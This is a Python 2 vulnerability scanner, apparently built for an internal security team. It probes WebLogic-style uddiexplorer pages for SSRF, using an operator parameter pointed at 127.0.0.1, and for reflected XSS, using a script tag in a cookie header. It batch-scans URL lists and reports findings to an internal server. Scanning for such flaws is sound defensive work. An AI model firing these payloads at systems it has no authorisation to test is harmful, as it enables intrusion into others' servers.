# -*- coding: utf-8 -*-

import urllib2
import utils
import urllib
import logging
import argparse
from multiprocessing.dummy import Pool as ThreadPool
import utils


logging.basicConfig(level=logging.INFO)
def detect_ssrf(url):
	try:
		logging.info("url is %s", url)
		(host,port) = utils.process_url(url)
		targeturl = "http://" + host + ":" + str(port) + "/uddiexplorer/SearchPublicRegistries.jsp"
		logging.info("targeturl is %s", targeturl)
		urllib2.urlopen(targeturl, timeout=20)
		payload = "?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:{}".format(port)
		r = urllib2.urlopen(targeturl+payload, timeout=20).read()
		if "Operation timed out" in r or "Socket Closed" in r or "Received a response from url" in r or "Connection reset by peer" in r:
			print "[+] uddiexplorer ssrf FOUND!"
			return 1
		else:
			print "[-] uddiexplorer ssrf NOT FOUND"
			return 0
	except Exception, e:
		print e
		return 0
def detect_uddi_xss(url):
	headers = {
	'Host': '127.0.0.1:80',
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
	'Upgrade-Insecure-Requests': '1',
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
	'Accept-Encoding': 'gzip, deflate',
	'Accept-Language': 'zh-CN,zh;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6,zh-TW;q=0.5',
	'Cookie': 'publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|; privateinquiryurls=<script>alert(2)</script>; JSESSIONID=h0Vd0MghcMhQ2XG5MkQnGgylJPlymlnpqJJn2T0ryvL3PL04tv1w!1520773416',
	'Connection': 'close'
	}
	try:
		(host,port) = utils.process_url(url)
		targeturl = "http://" + host + ":" + str(port) + '/uddiexplorer/SetupUDDIExplorer.jsp'
		logging.info(targeturl)
		req = urllib2.Request(targeturl, headers=headers)
		r = urllib2.urlopen(req, timeout=5)
		if r'<script>alert(2)</script>' in r.read():
			print "[+] uddiexplorer Reflected XSS FOUND!!", url
			return 1
		else:
			print "[-] uddiexplorer Reflected XSS NOT FOUND", url
			return 0
	except Exception,e:
		print e
		return 0
		
if __name__=="__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("-s","--single",dest="target", help='enter a valid url')
	parser.add_argument('-b', '--batch', dest="batch", default=False, action="store_true", help='do a batch scan')
	options = parser.parse_args()
	target = options.target
	batch = options.batch
	if target and not batch:
		detect_ssrf(target)
		detect_uddi_xss(target)

	elif batch and not target:
		urllist = utils.get_url_list("http://192.168.17.89:8080/RDP/safeTeamUtil/safeTeamUtil!getAllUrls.do")
		if urllist:
			logging.info("obtaining urllist successfully")
			# 030102
			pool = ThreadPool(10)
			results_ssrf = pool.map(detect_ssrf, urllist)
			results_xss = pool.map(detect_uddi_xss, urllist)
			pool.close()
			pool.join()

			json_ssrf = utils.assembly_data("030102", dict(zip(urllist, results_ssrf)))
			print "ssrf vulnerable hosts has", len(filter(lambda x: x == 1, results_ssrf))
			print utils.post_data(json_ssrf, "http://192.168.17.89:8080/RDP/safeTeamUtil/safeTeamUtil!recordVulnerability.do")

			json_xss = utils.assembly_data("030112", dict(zip(urllist, results_xss)))
			print "xss vulnerable hosts has", len(filter(lambda x : x == 1, results_xss))
			print utils.post_data(json_xss, "http://192.168.17.89:8080/RDP/safeTeamUtil/safeTeamUtil!recordVulnerability.do")
	else:
		parser.print_help()